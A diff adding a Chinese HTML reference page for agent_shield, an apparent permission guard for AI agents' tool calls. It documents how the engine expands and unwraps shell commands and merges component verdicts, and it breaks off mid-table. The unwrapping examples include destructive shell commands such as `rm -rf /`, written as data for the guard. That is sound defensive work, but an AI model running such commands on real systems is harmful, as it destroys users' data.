@@ -1,0 +1,2072 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>agent_shield 组件与配置参考</title>
+<style>
+  :root {
+    --bg: #f4f5f7; --card: #fff; --ink: #1f2937; --muted: #6b7280; --line: #d1d5db;
+    --blue: #2563eb; --blue-bg: #eff6ff; --green: #16a34a; --green-bg: #f0fdf4;
+    --orange: #ea580c; --orange-bg: #fff7ed; --red: #dc2626; --gray: #4b5563; --gray-bg: #f3f4f6;
+    --nav: #0f172a;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    font-family: "Microsoft YaHei", "PingFang SC", "Noto Sans SC", sans-serif;
+    background: var(--bg); color: var(--ink);
+    display: grid; grid-template-columns: 220px minmax(0, 1fr); min-height: 100vh;
+  }
+  a { color: inherit; text-decoration: none; }
+
+  .nav {
+    position: sticky; top: 0; align-self: start; height: 100vh;
+    background: var(--nav); color: #e2e8f0; padding: 18px 14px;
+    overflow: auto; display: flex; flex-direction: column; gap: 4px;
+  }
+  .nav .brand { font-size: 13px; font-weight: 700; color: #fff; margin-bottom: 4px; line-height: 1.35; }
+  .nav .brand small { display: block; font-weight: 400; font-size: 11px; color: #94a3b8; margin-top: 3px; }
+  .nav a {
+    display: block; font-size: 12px; color: #cbd5e1; padding: 7px 9px; border-radius: 6px; line-height: 1.35;
+  }
+  .nav a:hover { background: rgba(255,255,255,.08); color: #fff; }
+  .nav a.active { background: #2563eb; color: #fff; font-weight: 700; }
+  .nav .sub { padding-left: 16px; font-size: 11.5px; color: #94a3b8; }
+  .nav .hint { margin-top: auto; padding-top: 12px; font-size: 10.5px; color: #64748b; line-height: 1.45; }
+
+  .main { max-width: 1180px; padding: 28px 32px 64px; }
+  .doc-hero {
+    background: #fff; border: 1.5px solid var(--line); border-radius: 12px;
+    padding: 22px 24px; margin-bottom: 28px;
+  }
+  .doc-hero h1 { font-size: 24px; font-weight: 700; margin-bottom: 6px; }
+  .doc-hero .lead { font-size: 13.5px; color: var(--muted); margin-bottom: 12px; }
+  .meta { display: flex; gap: 14px; flex-wrap: wrap; font-size: 12px; color: var(--muted); }
+  .meta b { color: var(--ink); }
+
+  .sec {
+    background: #fff; border: 1.5px solid var(--line); border-radius: 12px;
+    padding: 20px 22px 22px; margin-bottom: 18px; scroll-margin-top: 16px;
+  }
+  .sec > h2 {
+    font-size: 18px; font-weight: 700; margin-bottom: 4px;
+    padding-bottom: 8px; border-bottom: 1px solid var(--line);
+  }
+  .sec > .sub { font-size: 12.5px; color: var(--muted); margin: 8px 0 14px; }
+  .sec h3 {
+    font-size: 14px; font-weight: 700; color: #374151;
+    margin: 18px 0 10px; padding-top: 4px;
+  }
+  .sec h3:first-of-type { margin-top: 4px; }
+  .note-line { font-size: 12px; color: var(--muted); margin-top: 10px; }
+
+  .grid { display: grid; gap: 12px; }
+  .cols-2 { grid-template-columns: 1fr 1fr; }
+  .cols-3 { grid-template-columns: 1fr 1fr 1fr; }
+  @media (max-width: 980px) {
+    body { grid-template-columns: 1fr; }
+    .nav { position: relative; height: auto; }
+    .cols-2, .cols-3 { grid-template-columns: 1fr; }
+  }
+
+  .panel {
+    background: var(--card); border: 1.5px solid var(--line); border-radius: 10px;
+    padding: 10px 12px; display: flex; flex-direction: column; gap: 6px;
+  }
+  .ph {
+    font-size: 12px; font-weight: 700; padding: 5px 8px; border-radius: 6px;
+    color: #fff; text-align: center;
+  }
+  .ph.blue { background: var(--blue); } .ph.green { background: var(--green); }
+  .ph.orange { background: var(--orange); } .ph.red { background: var(--red); }
+  .ph.gray { background: var(--gray); }
+  .stack { display: flex; flex-direction: column; gap: 6px; }
+
+  table.ref {
+    width: 100%; border-collapse: collapse; font-size: 12px; background: #fff;
+  }
+  table.ref th, table.ref td {
+    border: 1px solid var(--line); padding: 6px 8px; line-height: 1.4; vertical-align: top; text-align: left;
+  }
+  table.ref th { background: var(--gray-bg); font-size: 11.5px; font-weight: 700; }
+  table.ref td.k {
+    font-family: Consolas, "Courier New", monospace; font-weight: 700; white-space: nowrap; width: 18%;
+  }
+  table.ref code, .mono {
+    font-family: Consolas, "Courier New", monospace; font-size: 11px;
+    background: #f1f5f9; padding: 0 3px; border-radius: 3px;
+  }
+  pre.ex {
+    font-family: Consolas, "Courier New", monospace; font-size: 12px; line-height: 1.5;
+    background: #111827; color: #e5e7eb; border-radius: 8px; padding: 12px 14px;
+    overflow: auto; white-space: pre; margin: 0;
+  }
+  pre.ex .c { color: #9ca3af; }
+  pre.ex .k { color: #93c5fd; }
+  pre.ex .s { color: #86efac; }
+  pre.ex .n { color: #fbbf24; }
+
+  .box {
+    border: 1px solid var(--line); border-radius: 7px; background: #fafafa;
+    padding: 8px 10px; text-align: left; font-size: 12.5px;
+  }
+  .box .n { font-weight: 700; font-size: 13px; }
+  .box .d { font-size: 12px; color: var(--muted); margin-top: 2px; line-height: 1.45; }
+  .hi-blue { background: var(--blue-bg); border-color: #93c5fd; }
+  .hi-green { background: var(--green-bg); border-color: #86efac; }
+  .hi-orange { background: var(--orange-bg); border-color: #fdba74; }
+  .hi-gray { background: var(--gray-bg); border-color: #9ca3af; }
+
+  .callout {
+    border: 1.5px solid #cbd5e1; background: #fff; border-radius: 8px;
+    padding: 8px 12px; font-size: 12.5px; font-weight: 600; line-height: 1.45; text-align: left;
+  }
+  .callout.warn { border-color: #fdba74; background: #fffbeb; }
+  .callout.info { border-color: #93c5fd; background: var(--blue-bg); }
+
+  .badge {
+    display: inline-block; font-size: 10px; font-weight: 700; padding: 1px 6px;
+    border-radius: 4px; margin-left: 4px;
+  }
+  .badge.on { background: #dcfce7; color: #166534; }
+  .badge.off { background: #e5e7eb; color: #4b5563; }
+  .badge.code { background: #dbeafe; color: #1d4ed8; }
+  .badge.warn { background: #ffedd5; color: #9a3412; }
+
+  /* PermissionEngine flow */
+  .flow-page { display: flex; flex-direction: column; gap: 8px; }
+  .flow-top {
+    border: 2px solid #27ae60; background: #eafaf1; border-radius: 10px;
+    padding: 10px 14px; text-align: center; font-size: 14px; font-weight: 700; color: #1e8449;
+  }
+  .flow-top small { display: block; font-weight: 400; font-size: 12px; color: #5d7a68; margin-top: 2px; }
+  .flow-down { text-align: center; font-size: 16px; color: #aaa; line-height: 1; }
+  .flow-main {
+    display: grid; grid-template-columns: 1.35fr 220px; gap: 14px; align-items: stretch;
+  }
+  @media (max-width: 900px) { .flow-main { grid-template-columns: 1fr; } }
+  .flow-steps { display: flex; flex-direction: column; gap: 8px; }
+  .flow-step {
+    border: 2px solid #c5cdd1; background: #fff; border-radius: 10px; padding: 10px 12px;
+  }
+  .flow-step .lab {
+    font-size: 13px; font-weight: 700; color: #555; margin-bottom: 6px;
+  }
+  .flow-step .lab span { font-weight: 400; color: #999; margin-left: 6px; font-size: 12px; }
+  .cand-row { display: flex; gap: 8px; flex-wrap: wrap; }
+  .cand {
+    flex: 1; min-width: 120px; border: 2px solid #27ae60; background: #eafaf1;
+    border-radius: 8px; padding: 8px 10px; text-align: center;
+  }
+  .cand b { display: block; font-size: 13px; color: #1e8449; }
+  .cand small { font-size: 11px; color: #5d7a68; }
+  .branch {
+    display: grid; grid-template-columns: 1fr 36px 1.2fr; gap: 6px; align-items: stretch;
+  }
+  .hit {
+    border: 2px solid #27ae60; background: #eafaf1; border-radius: 8px; padding: 8px 10px;
+    font-size: 12.5px; color: #1e8449; font-weight: 700; display: flex; flex-direction: column; justify-content: center;
+  }
+  .hit small { font-weight: 400; color: #5d7a68; margin-top: 2px; }
+  .or {
+    display: flex; align-items: center; justify-content: center;
+    font-size: 12px; font-weight: 700; color: #999;
+  }
+  .miss {
+    border: 2px dashed #e0a040; background: #fffaf0; border-radius: 8px; padding: 8px 10px;
+    font-size: 12.5px; color: #b9770e; font-weight: 700; display: flex; flex-direction: column; justify-content: center;
+  }
+  .miss small { font-weight: 400; color: #a07840; margin-top: 2px; }
+  .chips { display: flex; flex-wrap: wrap; gap: 6px; }
+  .chip {
+    border: 2px solid #27ae60; background: #eafaf1; color: #1e8449;
+    font-weight: 700; font-size: 12px; padding: 5px 9px; border-radius: 7px;
+  }
+  .chip.off { border-style: dashed; background: #fff; color: #b9770e; border-color: #e0a040; }
+  .chip.warn { font-weight: 600; }
+  .flow-merge {
+    border: 2px solid #5d6d7e; background: #f4f6f7; border-radius: 10px;
+    padding: 14px 12px; display: flex; flex-direction: column; align-items: center;
+    justify-content: center; gap: 7px;
+  }
+  .flow-merge h3 { font-size: 14px; color: #2c3e50; margin: 0; padding: 0; }
+  .flow-merge .note { font-size: 11.5px; color: #777; text-align: center; line-height: 1.45; }
+  .pill {
+    width: 140px; text-align: center; border-radius: 8px; padding: 6px 0;
+    font-size: 13px; font-weight: 700;
+  }
+  .p3 { background: #fadbd8; color: #c0392b; }
+  .p2 { background: #fdebd0; color: #b9770e; }
+  .p1 { background: #e5e8e8; color: #566573; }
+  .p0 { background: #d5f5e3; color: #1e8449; }
+  .strict { font-size: 11px; color: #999; }
+  .flow-out {
+    border: 2px solid #27ae60; background: #eafaf1; border-radius: 10px;
+    padding: 10px 14px; text-align: center; font-size: 14px; font-weight: 700; color: #1e8449;
+  }
+  .flow-out small { display: block; font-weight: 400; font-size: 12px; color: #5d7a68; margin-top: 2px; }
+  .flow-legend {
+    display: flex; gap: 18px; justify-content: center; font-size: 12px; color: #666; align-items: center;
+  }
+  .flow-legend .chip { font-size: 11px; padding: 2px 8px; }
+
+  .top-link {
+    display: inline-block; margin-top: 8px; font-size: 12px; color: var(--blue); font-weight: 600;
+  }
+  .explain {
+    margin-top: 14px; border: 1.5px solid #fdba74; background: #fffaf5; border-radius: 10px;
+    padding: 12px 14px; font-size: 12.5px; line-height: 1.55; color: #374151;
+  }
+  .explain h4 { font-size: 13px; font-weight: 700; color: #9a3412; margin-bottom: 6px; }
+  .explain p { margin: 0 0 8px; }
+  .explain p:last-child { margin-bottom: 0; }
+  .explain ul { margin: 0 0 8px 1.1em; }
+  .explain li { margin: 2px 0; }
+  .explain code {
+    font-family: Consolas, "Courier New", monospace; font-size: 11.5px;
+    background: #fff; border: 1px solid #f0d0b0; padding: 0 3px; border-radius: 3px;
+  }
+
+  /* 10. 经 relay-claw 的拦截顺序 */
+  .ctx-flow .legend {
+    display: flex; justify-content: center; gap: 16px; flex-wrap: wrap;
+    margin-bottom: 14px; font-size: 12px; color: #555;
+  }
+  .ctx-flow .legend i {
+    display: inline-block; width: 12px; height: 12px; border-radius: 2px;
+    vertical-align: -1px; margin-right: 5px; border: 1.5px solid;
+  }
+  .ctx-flow .lg-fe { background: #f4f4f5; border-color: #71717a; }
+  .ctx-flow .lg-api { background: #eef2ff; border-color: #6366f1; }
+  .ctx-flow .lg-rail { background: #dbeafe; border-color: #2563eb; }
+  .ctx-flow .lg-sec { background: #d1fae5; border-color: #059669; }
+  .ctx-flow .lg-warn { background: #ffedd5; border-color: #ea580c; }
+  .ctx-flow .lg-sbx { background: #e0f2fe; border-color: #0284c7; }
+  .ctx-flow .layer {
+    border: 1.5px solid #d4d4d8; border-radius: 10px;
+    padding: 10px 12px; background: #fafafa;
+  }
+  .ctx-flow .layer .zh {
+    font-size: 11px; font-weight: 700; color: #71717a; margin-bottom: 8px;
+  }
+  .ctx-flow .box {
+    border: 1.5px solid #a1a1aa; border-radius: 8px; background: #fff;
+    padding: 10px 8px; text-align: center; min-height: 48px;
+    display: flex; flex-direction: column; justify-content: center; align-items: center;
+  }
+  .ctx-flow .box .n { font-size: 13px; font-weight: 700; color: #1a1a1a; line-height: 1.3; }
+  .ctx-flow .box .r { font-size: 11px; color: #777; margin-top: 2px; }
+  .ctx-flow .box.fe { border-color: #71717a; background: #f4f4f5; }
+  .ctx-flow .box.api { border-color: #6366f1; background: #eef2ff; }
+  .ctx-flow .box.api .n { color: #4338ca; }
+  .ctx-flow .box.rail { border-color: #2563eb; background: #dbeafe; }
+  .ctx-flow .box.rail .n { color: #1d4ed8; }
+  .ctx-flow .box.sec { border-width: 2px; border-color: #059669; background: #d1fae5; }
+  .ctx-flow .box.sec .n { color: #047857; }
+  .ctx-flow .box.warn { border-color: #ea580c; background: #ffedd5; }
+  .ctx-flow .box.warn .n { color: #c2410c; }
+  .ctx-flow .box.sbx { border-color: #0284c7; background: #e0f2fe; }
+  .ctx-flow .box.sbx .n { color: #0369a1; }
+  .ctx-flow .box.ext { border-color: #a1a1aa; background: #f4f4f5; }
+  .ctx-flow .row { display: grid; gap: 10px; }
+  .ctx-flow .row-3 { grid-template-columns: 1fr 1fr 1fr; }
+  .ctx-flow .row-2 { grid-template-columns: 1fr 1fr; }
+  .ctx-flow .varr {
+    height: 28px; display: flex; align-items: center; justify-content: center; position: relative;
+  }
+  .ctx-flow .varr::before { content: ""; width: 2px; height: 100%; background: #334155; }
+  .ctx-flow .varr span {
+    position: absolute; background: #fff; padding: 0 8px; font-size: 11px; color: #64748b;
+  }
+  .ctx-flow .pipe {
+    border: 2px dashed #3b82f6; border-radius: 12px;
+    background: #f8fbff; padding: 12px 14px; margin-top: 4px;
+  }
+  .ctx-flow .pipe .zh { color: #1d4ed8; font-size: 11px; font-weight: 700; margin-bottom: 10px; }
+  .ctx-flow .rail-wrap {
+    border: 2px solid #2563eb; border-radius: 10px; background: #fff; overflow: hidden;
+  }
+  .ctx-flow .rail-wrap .hd {
+    background: #2563eb; color: #fff; text-align: center;
+    padding: 8px; font-size: 13px; font-weight: 700;
+  }
+  .ctx-flow .rail-wrap .hd .sub {
+    display: block; font-size: 11px; font-weight: 500; opacity: 0.9; margin-top: 2px;
+  }
+  .ctx-flow .rail-wrap .bd { padding: 12px 14px; }
+  .ctx-flow .seq { display: flex; flex-direction: column; align-items: center; gap: 0; }
+  .ctx-flow .seq-item { width: 100%; max-width: 560px; }
+  .ctx-flow .seq-arrow {
+    color: #334155; font-size: 16px; font-weight: 700; line-height: 1; padding: 2px 0; text-align: center;
+  }
+  .ctx-flow .seq-arrow small {
+    display: block; font-size: 10px; font-weight: 400; color: #94a3b8; margin-top: 1px;
+  }
+  .ctx-flow .nest {
+    margin: 8px 16px 0; padding: 10px;
+    border: 2px solid #059669; border-radius: 8px; background: #ecfdf5;
+  }
+  .ctx-flow .shield-row {
+    display: grid; grid-template-columns: 1.4fr 1fr; gap: 8px; align-items: stretch;
+  }
+  .ctx-flow .side-row {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 12px;
+  }
+  .ctx-flow .part {
+    margin-top: 22px; border-top: 1.5px solid #e4e4e7; padding-top: 16px;
+  }
+  .ctx-flow .part h3 { font-size: 15px; font-weight: 700; margin-bottom: 8px; color: var(--ink); }
+  .ctx-flow .part .hint { font-size: 12.5px; color: #555; line-height: 1.55; margin-bottom: 10px; }
+  .ctx-flow table.iso th.off { color: #166534; }
+  .ctx-flow table.iso th.on { color: #9a3412; }
+  .ctx-flow table.iso td.mod { font-weight: 700; color: #1e293b; white-space: nowrap; }
+  .ctx-flow table.iso td.mod.warn { color: #c2410c; }
+  .ctx-flow table.iso td.mod.sec { color: #047857; }
+  .ctx-flow table.iso td.off { color: #166534; }
+  .ctx-flow table.iso td.on { color: #9a3412; }
+  .ctx-flow .foot { margin-top: 12px; font-size: 12px; color: #666; line-height: 1.55; }
+  @media (max-width: 980px) {
+    .ctx-flow .row-3, .ctx-flow .row-2, .ctx-flow .shield-row { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<nav class="nav" id="toc">
+  <div class="brand">agent_shield<br>组件与配置参考
+    <small>滚轮阅读 · 点击跳转</small>
+  </div>
+  <a href="#top">概述</a>
+  <a href="#manager">1. PermissionManager</a>
+  <a href="#engine">1.1 PermissionEngine</a>
+  <a class="sub" href="#candidate-scope">各组件看哪些候选</a>
+  <a class="sub" href="#command-expand">剥壳与拆子命令</a>
+  <a class="sub" href="#check-permission-flow">check_permission 流程</a>
+  <a href="#tiered">2. TieredPolicy</a>
+  <a class="sub" href="#tiered-order">判定顺序 / 结构底线</a>
+  <a class="sub" href="#tiered-keys">配置项</a>
+  <a class="sub" href="#tiered-rules">规则字段与示例</a>
+  <a href="#toolguard">3. Allowlist / Injection / Warning</a>
+  <a href="#fileguard">4. FileGuard</a>
+  <a href="#icp">5. ImmutableControlPlane</a>
+  <a href="#hostguard">6. HostGuard</a>
+  <a href="#netguard">7. NetGuard</a>
+  <a href="#detection">8. detection</a>
+  <a href="#example">9. 完整配置示例</a>
+  <a href="#runtime-chain">10. 经 relay-claw 的拦截顺序</a>
+  <a href="#audit-log">11. 审计日志</a>
+  <div class="hint">上篇：agent_shield_refactor.html<br>依据：agent_shield 源码契约</div>
+</nav>
+
+<main class="main" id="top">
+  <header class="doc-hero">
+    <h1>框架 + Component · 配置项随组件说明</h1>
+    <p class="lead">下篇 · tool_permission 全组件 + detection · 单页连续阅读</p>
+    <div class="meta">
+      <span><b>上篇</b> agent_shield_refactor.html（背景与行为变更）</span>
+      <span><b>范围</b> tool_permission 全组件 + detection</span>
+      <span><b>依据</b> agent_shield 源码契约</span>
+    </div>
+  </header>
+
+  <!-- Manager -->
+  <section class="sec" id="manager">
+    <h2>1. 框架 · PermissionManager</h2>
+    <p class="sub">进程内单例 · key → 完整配置 · 不做规则匹配、不合并差量</p>
+    <div class="grid cols-2">
+      <div class="panel">
+        <div class="ph blue">职责与契约</div>
+        <div class="stack">
+          <div class="box hi-blue"><div class="n">update_config(config, key=None)</div><div class="d">登记或整体替换该 key 的引擎；非法配置抛错且表不变</div></div>
+          <div class="box"><div class="n">check_permission(tool, args, key=None)</div><div class="d">按已登记 key 判定；未登记 → KeyError（不回退 default）</div></div>
+          <div class="box"><div class="n">check_permission(..., config=cfg)</div><div class="d">一次性临时引擎；不登记；与 key 同传时以 config 为准</div></div>
+          <div class="box"><div class="n">remove_config(key)</div><div class="d">移除；default 不可移除</div></div>
+          <div class="box"><div class="n">max_keys</div><div class="d">默认 1024（不含 default）；超额 → RuntimeError</div></div>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="ph green">key 约定（使用方）</div>
+        <pre class="ex"><span class="c"># 个人版基线</span>
+key = <span class="s">"default"</span>
+
+<span class="c"># 企业版用户级（示例）</span>
+key = <span class="s">"group:&lt;g&gt;/bot:&lt;b&gt;/user:&lt;u&gt;"</span>
+
+<span class="c"># 临时 Skill 授权</span>
+<span class="c"># 不登记 key，调用时传 config=合成结果</span>
+<span class="c"># 日志标记 key=(one-off)</span></pre>
+        <div class="box"><div class="n">审计</div><div class="d"><code>permission.manager.update key=… replaced=…</code><br><code>permission.manager.unregistered_key</code></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Engine -->
+  <section class="sec" id="engine">
+    <h2>1.1 框架 · PermissionEngine</h2>
+    <p class="sub">一次 check_permission 如何算出结论 · 候选展开 → 整调用短路 / 组件 → 候选结论 → 取最严</p>
+    <div class="flow-page">
+      <div class="flow-top">输入：tool_name + tool_args<small>PermissionEngine.check_permission() · enabled=false 时直接 ALLOW</small></div>
+      <div class="flow-down">▼</div>
+      <div class="flow-main">
+        <div class="flow-steps">
+          <div class="flow-step">
+            <div class="lab">① 展开候选<span>shell 命令可能产生多视图；候选取最严</span></div>
+            <div class="cand-row">
+              <div class="cand"><b>原文</b><small>完整 command</small></div>
+              <div class="cand"><b>剥壳</b><small>去掉 bash -c / pwsh -Command 等一层</small></div>
+              <div class="cand"><b>子命令</b><small>AST 拆出的叶子</small></div>
+            </div>
+          </div>
+          <div class="flow-step">
+            <div class="lab">② approval 短路<span>仅整条 / 剥壳命中 approval_overrides</span></div>
+            <div class="branch">
+              <div class="hit">命中 → 直接 ALLOW<small>本次调用结束，不再跑其它组件</small></div>
+              <div class="or">否</div>
+              <div class="miss">未命中 → 进入③<small>逐候选继续判定</small></div>
+            </div>
+          </div>
+          <div class="flow-step">
+            <div class="lab">③ 各组件判定<span>返回 None = 弃权，不参与合并</span></div>
+            <div class="chips">
+              <span class="chip">Injection</span>
+              <span class="chip">CommandAllowlist</span>
+              <span class="chip warn">DestructiveWarning（仅警告）</span>
+              <span class="chip">TieredPolicy</span>
+              <span class="chip off">HostGuard</span>
+              <span class="chip off">FileGuard</span>
+              <span class="chip off">ImmutableControlPlane</span>
+              <span class="chip off">NetGuard</span>
+            </div>
+          </div>
+          <div class="flow-step">
+            <div class="lab">④ 形成候选结论<span>进入⑤前先定每个候选的结果</span></div>
+            <div class="branch">
+              <div class="hit">子命令命中 approval → 该候选 ALLOW<small>只定这一候选，不结束整次调用</small></div>
+              <div class="or">否则</div>
+              <div class="miss">对该候选取③中组件最严<small>作为该候选结论</small></div>
+            </div>
+          </div>
+        </div>
+        <div class="flow-merge">
+          <h3>⑤ 取最严格</h3>
+          <div class="strict">严格 ↑</div>
+          <div class="pill p3">DENY</div>
+          <div class="pill p2">ASK</div>
+          <div class="pill p1">UNDETERMINED</div>
+          <div class="pill p0">ALLOW</div>
+          <div class="strict">宽松 ↓</div>
+          <div class="note">对各候选结论再取严<br>全部弃权 → ASK</div>
+        </div>
+      </div>
+      <div class="flow-down">▼</div>
+      <div class="flow-out">输出：PermissionResult<small>permission · matched_rule · reason · warnings · external_paths</small></div>
+      <div class="flow-legend">
+        <span><span class="chip">实线</span> 默认参与</span>
+        <span><span class="chip off">虚线</span> 默认关闭 / 需配置后生效</span>
+      </div>
+    </div>
+    <p class="note-line">框架配置 enabled / runtime.* 见各消费组件节</p>
+
+    <h3 id="candidate-scope" style="margin-top:18px">各组件看哪些候选</h3>
+    <p class="sub" style="margin-top:0">引擎对 shell 可展开为原文 / 剥壳 / 子命令；非 shell 通常只有原文。下表按源码弃权条件整理（✓ 参与 · — 弃权）。</p>
+    <table class="ref">
+      <thead>
+        <tr>
+          <th>组件</th>
+          <th>原文 ORIGINAL</th>
+          <th>剥壳 UNWRAPPED</th>
+          <th>子命令 SUBCOMMAND</th>
+          <th>补充</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="k">Injection</td>
+          <td>✓</td><td>✓</td><td>—</td>
+          <td>仅 shell；按方言选正则</td>
+        </tr>
+        <tr>
+          <td class="k">CommandAllowlist</td>
+          <td>✓</td><td>✓</td><td>—</td>
+          <td>仅 shell；比命令首词</td>
+        </tr>
+        <tr>
+          <td class="k">DestructiveWarning</td>
+          <td>✓</td><td>✓</td><td>✓</td>
+          <td>仅 shell；不改 allow/ask/deny</td>
+        </tr>
+        <tr>
+          <td class="k">TieredPolicy</td>
+          <td>✓</td><td>✓</td><td>✓</td>
+          <td>规则/基线/defaults 三种都跑；<b>结构底线仅原文+剥壳</b></td>
+        </tr>
+        <tr>
+          <td class="k">HostGuard</td>
+          <td>✓</td><td>✓</td><td>✓</td>
+          <td>仅 shell，且工具名在安全名单（bash/powershell/…）；不按 kind 弃权</td>
+        </tr>
+        <tr>
+          <td class="k">FileGuard</td>
+          <td>✓</td><td>✓</td><td>—</td>
+          <td>路径抽取在原文/剥壳完成；子命令弃权</td>
+        </tr>
+        <tr>
+          <td class="k">ImmutableControlPlane</td>
+          <td>✓</td><td>✓</td><td>—</td>
+          <td>同 FileGuard：子命令弃权</td>
+        </tr>
+        <tr>
+          <td class="k">NetGuard</td>
+          <td colspan="3">不看候选 kind（代码 <code>del route</code>）</td>
+          <td>仅网络类工具名；非网络（含 bash）弃权</td>
+        </tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- Command expand: unwrap + subcommands -->
+  <section class="sec" id="command-expand">
+    <h2>剥壳与拆子命令</h2>
+    <p class="sub">权限视图如何得到 original / unwrapped / subcommand · 不改真实执行参数</p>
+
+    <div class="box hi-gray" style="margin-bottom:12px">
+      <div class="n">先分清概念（不要混）</div>
+      <div class="d">
+        <b>Shell 入口</b>：<code>tool_name</code> 是否走进「剥壳 / 展开」流水线（看工具名名单）。<br>
+        <b>Shell 解析器</b>：命令<strong>串</strong>里的启动器形态（如 <code>bash -c</code>、<code>cmd /c</code>、<code>pwsh -Command</code>）——剥壳认这个。<br>
+        <b>命令（payload）</b>：真正执行的叶子（如 <code>ls</code>、<code>rm</code>、<code>Get-ChildItem</code>）。<br>
+        <b>产品入口工具卡</b>：Agent 送来的 <code>tool_name</code>（如 <code>bash</code>、<code>mcp_exec_command</code>）。有的卡名看起来像解析器，有的只是代跑入口；<strong>不等于</strong>串里的解析器。
+      </div>
+    </div>
+
+    <div class="box hi-green" style="margin-bottom:12px">
+      <div class="n">两张表 + 按方言拆（已落地 Phase 1）</div>
+      <div class="d">
+        <table class="ref" style="margin:8px 0 0">
+          <thead><tr><th>表</th><th>代码</th><th>职责</th></tr></thead>
+          <tbody>
+            <tr><td class="k">A · 命令入口</td><td><code>routing._COMMAND_ENTRY_TOOLS</code></td><td><code>tool_name</code> 是否进入剥壳/展开</td></tr>
+            <tr><td class="k">B · 解析器启动器</td><td><code>canonicalize</code> 正则</td><td>命令<strong>串</strong>里剥谁</td></tr>
+          </tbody>
+        </table>
+        <p style="margin:8px 0 0">流程：① 入口表判定 → ② 保留 ORIGINAL → ③ 剥壳（有则 UNWRAPPED）→ ④ 对权限视图<strong>按方言</strong>拆子命令（<strong>无</strong> <code>SHELL_TOOLS</code> 五元组门禁）→ ⑤ 组件取最严。<br>
+          Phase 1 拆分后端：仅 <code>posix_shell</code> / <code>unknown</code> 走 bash AST；PowerShell / CMD 拆分属 Phase 2。</p>
+      </div>
+    </div>
+
+    <h3>1. 命令入口名单（表 A）</h3>
+    <p>判定：<code>tool_name</code> basename ∈ <code>_COMMAND_ENTRY_TOOLS</code>（<code>is_shell_tool</code>）。
+      <b>是</b> → 剥壳/展开；<b>否</b> → 仅 <code>original</code>。</p>
+    <p class="note-line">认的是<strong>工具名</strong>。不会把 <code>mcp_exec_command</code> 改成 bash；只对它的 <code>command</code> 串剥壳/拆分。</p>
+    <table class="ref">
+      <thead><tr><th>分组</th><th>tool_name（穷举）</th><th>方言</th></tr></thead>
+      <tbody>
+        <tr>
+          <td class="k">POSIX 名</td>
+          <td><code>bash</code> · <code>sh</code> · <code>zsh</code> · <code>ksh</code> · <code>dash</code> · <code>ash</code> · <code>fish</code></td>
+          <td><code>posix_shell</code></td>
+        </tr>
+        <tr>
+          <td class="k">PowerShell 名</td>
+          <td><code>powershell</code> · <code>powershell.exe</code> · <code>pwsh</code> · <code>pwsh.exe</code> · <code>core.powershell</code></td>
+          <td><code>powershell</code></td>
+        </tr>
+        <tr>
+          <td class="k">CMD 名</td>
+          <td><code>cmd</code> · <code>cmd.exe</code></td>
+          <td><code>cmd</code></td>
+        </tr>
+        <tr>
+          <td class="k">代跑入口</td>
+          <td><code>mcp_exec_command</code> · <code>create_terminal</code></td>
+          <td>args：<code>shell</code> / <code>shell_type</code> / <code>executable</code> / <code>interpreter</code>；否则 <code>unknown</code></td>
+        </tr>
+      </tbody>
+    </table>
+    <p class="note-line">例：<code>/usr/bin/bash</code> → 入口。<code>read_file</code> → 非入口。</p>
+
+    <h3>2. Shell 解析器名单（剥壳认谁）</h3>
+    <p>剥壳盯的是<strong>命令串里的解析器启动形态</strong>，不是 Agent 工具名，也不是 <code>ls</code> 这类 payload。</p>
+    <table class="ref">
+      <thead><tr><th>方言</th><th>解析器（启动器）</th><th>典型启动形态</th></tr></thead>
+      <tbody>
+        <tr>
+          <td class="k">CMD</td>
+          <td><code>cmd</code> · <code>cmd.exe</code></td>
+          <td><code>/c</code> 或 <code>//c</code> + 引号串 / 无空格裸串</td>
+        </tr>
+        <tr>
+          <td class="k">PowerShell</td>
+          <td><code>powershell</code> · <code>powershell.exe</code> · <code>pwsh</code> · <code>pwsh.exe</code></td>
+          <td>中间可夹 <code>-Xxx</code>，再 <code>-Command</code> / <code>-c</code> + 引号串 / 裸串</td>
+        </tr>
+        <tr>
+          <td class="k">POSIX</td>
+          <td><code>bash</code> · <code>sh</code> · <code>zsh</code> · <code>dash</code> · <code>ash</code>（可带路径 / <code>.exe</code> / 引号路径）</td>
+          <td>行首或紧跟 <code>; &amp; | ( )</code> 之后；中间可夹开关；再<strong>带字母 c 的短选项</strong>（<code>-c</code>/<code>-lc</code>/<code>-cl</code>/<code>-ic</code>…）+ 引号串 / 裸串</td>
+        </tr>
+      </tbody>
+    </table>
+    <p class="note-line"><code>ksh</code> / <code>fish</code> 等若要支持剥壳，应显式加入上表；主流解析器都支持某种复合命令，差别在<strong>语法方言</strong>，不是「能不能复合」。</p>
+
+    <h3>3. 剥壳（遇解析器 → 生成内层命令）</h3>
+    <p>函数 <code>canonicalize_shell_command_for_permission</code>：整串<strong>最多剥 1 层</strong>；剥完 ≠ 原文才追加 <code>unwrapped</code>。无外壳时原文即权限视图，不产生 unwrapped。</p>
+    <table class="ref">
+      <thead><tr><th>会剥</th><th>例 → 剥壳后</th></tr></thead>
+      <tbody>
+        <tr><td class="k">CMD</td><td><code>cmd /c "dir C:"</code> → <code>dir C:</code></td></tr>
+        <tr><td class="k">PowerShell</td><td><code>pwsh -c 'Get-Date'</code> → <code>Get-Date</code><br><code>powershell -NoProfile -Command '…'</code> → 内层</td></tr>
+        <tr><td class="k">POSIX -c</td><td><code>bash -c 'rm x'</code> → <code>rm x</code><br><code>sh -lc "rm -rf /"</code> → <code>rm -rf /</code><br><code>/bin/zsh -c 'rm x'</code> → <code>rm x</code><br><code>bash --norc -c 'rm x'</code> → <code>rm x</code><br><code>cd d &amp;&amp; bash -c 'rm x'</code> → <code>cd d &amp;&amp; rm x</code></td></tr>
+      </tbody>
+    </table>
+    <table class="ref" style="margin-top:8px">
+      <thead><tr><th>不会剥</th><th>说明</th></tr></thead>
+      <tbody>
